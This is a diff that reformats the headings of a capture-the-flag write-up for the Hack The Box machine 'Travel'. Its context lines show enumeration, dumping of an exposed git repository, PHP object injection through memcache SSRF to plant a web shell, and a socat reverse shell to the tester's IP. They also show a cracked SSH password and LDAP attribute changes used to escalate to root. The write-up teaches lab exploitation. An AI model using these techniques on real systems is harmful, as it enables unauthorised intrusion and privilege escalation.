@@ -1,6 +1,8 @@
-# User
+# Travel
 
-## nmap
+## User
+
+### nmap
 
 ```
 ╭─zoey@parrot-virtual ~/sec
@@ -34,7 +36,7 @@ Nmap done: 1 IP address (1 host up) scanned in 64.78 seconds
 
 This gives use three hostnames to work with on the web server, perhaps there are some virtual hosts.
 
-## https
+### https
 
 Accessing any of the alternative names results in a page that states:
 
@@ -47,9 +49,9 @@ Thanks for your understanding,
 admin
 ```
 
-## http
+### http
 
-### blog.travel.htb
+#### blog.travel.htb
 
 Looking at blog.travel.htb source we can tell that it's wordpress, and running wpscan, it informs us that everything looks to be up to date and not vulnerable. There are
 various places that seem to direct us toward the RSS functionality and blog-dev, including the text on the main page `Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!` and in the source:
@@ -66,7 +68,7 @@ various places that seem to direct us toward the RSS functionality and blog-dev,
 
 So let's move on to it.
 
-### blog-dev.travel.htb
+#### blog-dev.travel.htb
 
 `/` is forbidden. Let's run some enum:
 
@@ -129,7 +131,7 @@ Looks like there's a git repository. Let's see what we can grab with the dumper 
 [+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da
 ```
 
-## Restoring blog-dev git repo
+### Restoring blog-dev git repo
 
 Let's take a look in our new folder and see what we dumped.
 
@@ -186,13 +188,13 @@ drwxr-xr-x 6 zoey zoey 4096 May 26 12:43 .git
 -rwxr-xr-x 1 zoey zoey 1387 May 26 12:43 template.php
 ```
 
-## Investigating Git Repo Files
+### Investigating Git Repo Files
 
-### README.md
+#### README.md
 
 This tells us how to setup a wordpress instance and copy in the custom code. Let's assume this is the code that's vulnerable.
 
-### template.php
+#### template.php
 
 In template.php we see some attempts to prevent certain vulnerabilities, and that `url_get_contents` makes a call to curl to retrieve contents. Given the call to
 `escapeshellargs` we're likely only going to have control over the url, and the exclusion of `file://` and `@` prevents LFI. However, it looks like the check to
@@ -246,7 +248,7 @@ be unserialized. This method also makes a call that writes contents to a file. I
     }
 ```
 
-### rss_template.php
+#### rss_template.php
 
 In this file we see that the query string is processed, and the values are used to retrieve an RSS feed. We should have control over the `custom_feed_url` and `debug`
 values in the query string:
@@ -299,7 +301,7 @@ function get_feed($url){
 This looks promising as we may be able to interact with memcached via SSRF, but there's no obvious serialize/unserialize yet. However,
 It seems plausible that a cache might serialize and unserialize its values, so let's investigate `SimplePie`.
 
-## SimplePie
+### SimplePie
 
 If we [search the wordpress git repo for 'unserialize'](https://github.com/WordPress/WordPress/search?q=unserialize) we find a [Memcache.php](https://github.com/WordPress/WordPress/blob/b3b8942dfcb451eddb5559b63c1043fce5d9449e/wp-includes/SimplePie/Cache/Memcache.php) that's part of SimplePie with the following functions:
 
@@ -419,7 +421,7 @@ So it seems like we should be able to generate the key used with
 echo 'xct_' . md5(md5('http://10.10.14.39/feed.html') . ':spc');
 ```
 
-## Object Injection Payload
+### Object Injection Payload
 
 We need to setup a serialized php object that's an instance of `TemplateHelper`, so that when the `__wakeup` method is run, we write
 a web shell to the logs directory. We can generate and test our payload with the following:
@@ -463,7 +465,7 @@ echo "$s\n";
 unserialize(urldecode($s));
 ```
 
-## memcache SSRF
+### memcache SSRF
 
 The last piece of the equation, is to be able to insert an item into memcache via a call to curl. So what's the command we actually want to
 execute? Looking up memcache documentation and setting up my own instance I find what works to insert the payload(remember the dots are null bytes):
@@ -520,7 +522,7 @@ echo $payload;
 
 FINALLY, we have something to generate a working payload.
 
-## Scripting The Reverse Shell
+### Scripting The Reverse Shell
 
 Let's make a call to the php script we just made for the payload and then use it to make the calls and connect a reverse shell. Be sure blog.travel.htb
 resolves to the box's address. I used a different payload the first time trying this as socat is not usually available, but it is, so lets use it
@@ -592,7 +594,7 @@ And on the remote machine via bash.php:
 www-data@blog:/var/www/html/wp-content/themes/twentytwenty# socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.39:22473
 ```
 
-## www-data enum and owning user
+### www-data enum and owning user
 
 So after enuming all the things, looking for vulnerabilities and potential credentials, and trying to crack all the credentials you've found thus far,
 check in `/opt/wordpress` and find a `backup-13-04-2020.sql`. Ask yourself why someone would put it there, then investigate it to find a dump of the
@@ -674,11 +676,11 @@ Stopped: Wed May 27 03:08:31 2020
 
 Use the login name from the backup(`lynik-admin`) and our newly discovered password(`1stepcloser`) to SSH in and `cat user.txt`. Feel satisfied...and then realize this is only halfway.
 
-# Root
+## Root
 
-## enum
+### enum
 
-### linpeas
+#### linpeas
 
 in `/etc/hosts`
 
@@ -694,7 +696,7 @@ root:x:0:0:root:/root:/bin/bash
 trvl-admin:x:1000:1000:trvl-admin:/home/trvl-admin:/bin/bash
 ```
 
-### nmap on ldap.travel.htb
+#### nmap on ldap.travel.htb
 
 Setup a socks proxy via ssh and run `nmap` against the ldap server:
 
@@ -723,7 +725,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 22.02 seconds
 ```
 
-### Home directory
+#### Home directory
 
 In `.ldaprc`:
 
@@ -746,7 +748,7 @@ In `.viminfo`:
 |4,48,3,0,1587670530,"~/.ldaprc"
 ```
 
-## ldap.travel.htb
+### ldap.travel.htb
 
 Searching...
 
@@ -818,7 +820,7 @@ result: 0 Success
 # numResponses: 1
 ```
 
-### JXplorer and ProxyChains
+#### JXplorer and ProxyChains
 
 Not knowing much about ldap I setup proxy chains with [JXplorer](http://jxplorer.org/). It allowed me to easily explore the hierarchy and test what values I could change/add/etc...
 
@@ -832,7 +834,7 @@ Not knowing much about ldap I setup proxy chains with [JXplorer](http://jxplorer
 Turns out that you can easily modify attributes, but that's about it, and we can't modify the `uid`. I also learned form JXplorer that you need to
 add the `ldapPublicKey` `objectClass`, before you can add the `sshPublicKey` object. A little googling reveals the required attributes(https://tylersguides.com/guides/openldap-how-to-add-a-user/). Let's see if we can script the modification and get in by altering the uid and guid numbers to those of `trvl-admin`.
 
-## Owning trvl-admin
+### Owning trvl-admin
 
 Note: You can skip this step if you like, it's unnecessary, but was part of the learning process for me. Let's create a script to make the necessary changes so we can ssh in:
 
@@ -934,13 +936,13 @@ trvl-admin@travel:~$ pwd
 
 Success! The home directory looks different than usual. Let's add in a public key to to the `/home/trvl-admin/.ssh/authorized_keys` file so we can easily get back in.
 
-## trvl-admin enum
+### trvl-admin enum
 
 After running some enum, and looking at what `trvl-admin` has access to that `lynik-admin` doesn't, there's not an obvious route to root. The most obvious route
 seems to be using `sudo`, and there's a `.sudo_as_admin_as_successful` file in the `trvl-admin` home directory. However, we don't have the password. We do,
 however, have the password for `lynik-admin`. What if we could login via ldap as `lynik-admin`, but with a `gidNumber` for the `sudo` group. Let's try it.
 
-## Owning Root
+### Owning Root
 
 Let's modify the numbers in our script and then run it:
 
